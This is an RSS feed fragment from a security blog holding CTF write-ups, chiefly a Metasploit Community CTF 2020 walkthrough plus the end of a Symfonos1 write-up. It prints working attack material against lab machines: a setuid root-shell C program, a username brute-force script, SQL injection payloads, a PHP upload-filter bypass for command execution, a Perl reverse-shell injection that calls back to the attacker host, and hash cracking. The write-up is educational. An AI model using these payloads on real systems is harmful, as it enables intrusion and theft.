&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
    setgid(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;); 
    setuid(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
    execl(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Reason why sending mails addressed to other users drops all the mails to helios is because of aliases set in postfix: /etc/postfix/main.cf&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos18.png&#34;  alt=&#34;symfonos1&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p&gt;
&lt;p&gt;Twitter: &lt;a href=&#34;https://twitter.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;Github: &lt;a href=&#34;https://github.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>Metasploit Community CTF December 2020 WriteUp</title>
      <link>https://blog.ikuamike.io/posts/2020/metasploitctf2020/</link>
      <pubDate>Mon, 07 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2020/metasploitctf2020/</guid>
      <description></description>
      <content>&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;Over the weekend I participated in &lt;a href=&#34;https://ctftime.org/event/1200&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Metasploit Community December CTF&lt;/a&gt;

 by Rapid7
with team &lt;a href=&#34;https://twitter.com/fr334aks&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;fr334aks&lt;/a&gt;

. We ended up getting position 57/413. The CTF was meant to be beginner-friendly.&lt;/p&gt;
&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
&lt;p&gt;Teams are provided with their own instance of a kali box which is public facing to act as a jump host to reach
an ubuntu VM which hosts the challenges.&lt;/p&gt;
&lt;p&gt;On the ubuntu VM there are 20 open ports for each challenge. To complete a challenge you need to find a challenge
flag and submit the MD5 checksum of the PNG to get points.&lt;/p&gt;
&lt;p&gt;I decided to tunnel all connections to the victim through ssh with sshuttle using the below command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sshuttle -r kali@52.90.96.4 -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ssh -i metasploit_ctf_kali_ssh_key.pem&amp;#34;&lt;/span&gt; 172.15.18.101/32
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;challenges&#34;&gt;Challenges:&lt;/h2&gt;
&lt;h3 id=&#34;4-of-hearts&#34;&gt;4 of Hearts&lt;/h3&gt;
&lt;p&gt;After tunneling the connections to the Ubuntu VM the first flag is on port 80, &lt;code&gt;http://172.15.18.101/4_of_hearts.png&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/4_of_hearts.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;6-of-hearts&#34;&gt;6 of Hearts&lt;/h3&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port6868.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;There is a photos website running on port 6868. There is a functionality to sign up that creates directories based on a user&amp;rsquo;s
initials of their names.&lt;/p&gt;
&lt;p&gt;On signing up we first get the notes directory.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port6868_1.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;On the home page, there are images which are hosted under files directory with different users initials.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port6868_2.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Since there&amp;rsquo;s no authentication we can try look at notes for each of the discovered users.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;BD&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port6868_4.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;TW&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port6868_5.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;MC&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port6868_6.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;From the above notes we can tell that there&amp;rsquo;s a site admin whose name is &lt;em&gt;Beth Ulysses Denise Donnoly Yager&lt;/em&gt;, this creates the initials
&lt;em&gt;BUDDY&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;We can then get the flag with these initials at the url &lt;code&gt;http://172.15.18.101:6868/files/BUDDY/2&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/6_of_hearts.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;3-of-spades&#34;&gt;3 of Spades&lt;/h3&gt;
&lt;p&gt;To solve this one we are required to identify a valid username aside from guest. When you submit guest which is a valid username, the
request takes about 5 seconds to complete but if you supply a non-valid username it takes less than a second. The password doesn&amp;rsquo;t
matter.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8080.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I created a python script to bruteforce the username with a wordlist:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests

url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://172.15.18.101:8080/login.php&amp;#34;&lt;/span&gt;

user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;guest&amp;#34;&lt;/span&gt;
f &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/usr/share/seclists/Usernames/cirt-default-usernames.txt&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;)
users &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;readlines()
f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;guess&lt;/span&gt;(username):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Testing username: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; username &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;...&amp;#34;&lt;/span&gt;)
    data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;:username,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;}
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(url, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;data)
    response_time &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;elapsed&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;total_seconds()

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; response_time &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Valid user found: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; username)
        exit()

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; users:
    guess(i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It found the user to be demo:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8080_2.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;When we submit it we get the url to the flag,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://172.15.18.101:8080/a3lk3d939d993201ld.png
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8080_1.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/3_of_spades.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;2-of-spades&#34;&gt;2 of Spades&lt;/h3&gt;
&lt;p&gt;There&amp;rsquo;s a website with the ability to search for reviews on port 9001.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port9001.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;First thing to check with search functionality is SQLi, after adding a quote &lt;code&gt;&#39;&lt;/code&gt; we get a sqlite3 error confirming presence of sqli:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port9001_1.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Using this payload we can get the structure of the db:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;overwatch&#39; union select 1,sql,3 FROM sqlite_master;-- -
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port9001_2.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Then we can extract the link to the flag with this payload:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;overwatch&#39; union select 1,flag,link FROM hidden-- -
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port9001_3.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/2_of_spades.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;8-of-hearts&#34;&gt;8 of Hearts&lt;/h3&gt;
&lt;p&gt;On port 4545, We are provided with 2 files:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port4545.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;When you run the elf binary it asks for buffalo and if you give one it asks for more.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port4545_1.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;All we needed to do was guess how many buffaloes it needed, the exact value was between 100 and 200.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port4545_2.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/8_of_hearts.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;8-of-spades&#34;&gt;8 of Spades&lt;/h3&gt;
&lt;p&gt;On port 1080 a socks5 proxy is running on this port without any authentication. We can edit &lt;code&gt;/etc/proxychains.conf&lt;/code&gt; and add this server as a socks5
proxy server.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;socks5  172.15.18.101 1080
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Next we need to discover open ports that we can access through the proxy. Port scanning over a proxy can be really slow, therefore, lets
check the top 100 ports first.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;proxychains nmap -sT --top-ports=100 127.0.0.1 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nmap discovers port 22 and 8000 open.&lt;/p&gt;
&lt;p&gt;Port 8000 is a web server hosting our flag:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;proxychains curl 127.0.0.1:8000
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port1080.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/8_of_spades.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;red-joker&#34;&gt;Red Joker&lt;/h3&gt;
&lt;p&gt;On port 9007, we get a zip file.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port9007.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Only thing needed is to extract it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;7z x red_joker.zip
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/joker_red.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;6-of-diamonds&#34;&gt;6 of Diamonds&lt;/h3&gt;
&lt;p&gt;On port 8200, there&amp;rsquo;s a website that we can upload images.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8200.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;It only allows jpeg and png files by checking mime type and file extension. We can bypass this restriction with a few tricks.&lt;/p&gt;
&lt;p&gt;We can create a php file with a valid jpeg mime type with this command:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo -n -e &#39;\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01&#39; &amp;gt; shell.php
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8200_3.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Then we can intercept the request in burp suite and change the extension and add our php exploit code.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8200_2.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We can successfully execute commands and get the location of the flag.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8200_4.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Flag was found at &lt;code&gt;http://172.15.18.101:8200/157a7640-0fa4-11eb-adc1-0242ac120002/6_of_diamonds.png&lt;/code&gt;.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/6_of_diamonds.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;queen-of-spades&#34;&gt;Queen of Spades&lt;/h3&gt;
&lt;p&gt;On port 8202, we have another website with barely any functionality to interact with.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8202.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;But when we look at burp where we are proxying http traffic, there is some communication to an api which looks very much like
graphql.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8202_1.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;A common misconfiguration to check is if introspection is enabled on the endpoint.&lt;/p&gt;
&lt;p&gt;When we supply an introspection payload (you can use the ones from &lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;payloadallthethings repo&lt;/a&gt;

) it works and we get the schema.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8202_3.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;To understand the result, we can easily visualize this at &lt;a href=&#34;https://apis.guru/graphql-voyager/&#34;&gt;https://apis.guru/graphql-voyager/&lt;/a&gt;&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8202_2.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;With this structure we can easily make our queries.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8202_4.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The below query gives the location of the flag.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8202_5.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/queen_of_spades.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;2-of-hearts&#34;&gt;2 of Hearts&lt;/h3&gt;
&lt;p&gt;On port 9000, there&amp;rsquo;s another website similar to the one port 9001 but this one has a different way in which it handles searches. When we search using
just a single character a, the first result is interesting as it looks like a folder in a terminal.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port9000.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;This could mean our input is being used to construct a shell command. We can try getting a reverse shell using this reverse shell payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;$&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(&lt;/span&gt;perl &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;use Socket;$i=&amp;#34;172.15.18.100&amp;#34;;$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We successfully get a reverse shell.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port9000_1.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The vulnerable code is using the find command:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port9000_2.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/2_of_hearts.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;black-joker&#34;&gt;Black Joker&lt;/h3&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8123.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The web app here has two visible functionalities:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8123_2.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;When we try to sign up, we get the response that no new members can signup. When trying to look at the request in burp suite, there was
none. Therefore it must be a frontend response.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8123_1.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;sign-up.js:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8123_3.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Looking at the forgotten your password functionality, we can supply an email. The home page contains this email: &lt;a href=&#34;mailto:admin@example.com&#34;&gt;admin@example.com&lt;/a&gt;.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8123_4.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;This gets us a hint but it&amp;rsquo;s not enough information. When we look at the full request in burp, there was actually more information
sent back that wasn&amp;rsquo;t displayed.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8123_5.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;From the js file we gather that the site accepts passwords between 9 and 14 chars long, which are should have only a-z and 0-9 characters.
Having a hash and the beginning of the password we can generate a wordlist and crack the hash.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;crunch &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; 0123456789abcdefghijklmnopqrstuvwxyz &amp;gt; temp
sed -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/^/ihatesalt/&amp;#39;&lt;/span&gt; temp &amp;gt; wordlist.txt
hashcat -m &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;7f35f82c933186704020768fd08c2f69&amp;#39;&lt;/span&gt; wordlist.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Recovered Password: ihatesaltalot7&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8123_6.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Supplying the email and password to /admin, we get the flag.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8123_7.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;strong&gt;Flag&lt;/strong&gt;:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/black_joker.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h3 id=&#34;4-of-clubs&#34;&gt;4 of Clubs&lt;/h3&gt;
&lt;p&gt;Port 8092:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/metasploitctf2020/port8092.png&#34;  alt=&#34;metasploit_ctf_2020&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;For this challenge, we were able to bypass the hash check by supplying the password as an empty array.&lt;/p&gt;

